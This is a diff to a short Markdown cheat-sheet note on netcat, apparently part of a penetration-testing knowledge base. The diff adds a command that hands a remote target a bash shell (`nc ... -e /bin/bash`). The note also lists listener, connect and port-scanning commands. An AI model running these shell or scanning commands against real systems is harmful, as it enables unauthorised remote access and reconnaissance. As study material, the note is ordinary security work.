@@ -1,4 +1,4 @@
-**Tags:** #type/tool #tactic/command-and-control 
+**Tags:** #type/tool #tactic/command-and-control  #todo
 **Link:** 
 **Purpose:** simple tool for connect shell and listeners
 
@@ -9,9 +9,9 @@ windows executables: https://github.com/int0x33/nc.exe/
 more sophisticated alternative: [[3 Tools/shells/Socat]]
 
 # Usage
-
-connect to machine: `nc <target-ip> <chosen-port>`
 start listener: `nc -lnvp <port>
+connect to machine: `nc <target-ip> <chosen-port>`
+start bin shell running bash: `nc -nv <target-ip> <chosen-port> -e /bin/bash`
 
 can also be used for **port scanning**:
 - TCP Scan: `nc -nvv -w 1 -z [IP] [START_PORT-END_PORT]`
@@ -19,7 +19,7 @@ can also be used for **port scanning**:
 	- `-z` = zero io mode
 - UDP Scan: same as tcp scan, use `-u` additionally
 	- if filtered, ports will be listed as open because no "ICMP port unreachable" is received 
-# Use Cases
+# Snippets
 ### Manual SMTP Connection
 connect to port 25, send [[2 Tech-Specifics/Network/Protocols/TCP 25 SMTP|SMTP]] commands manually
 
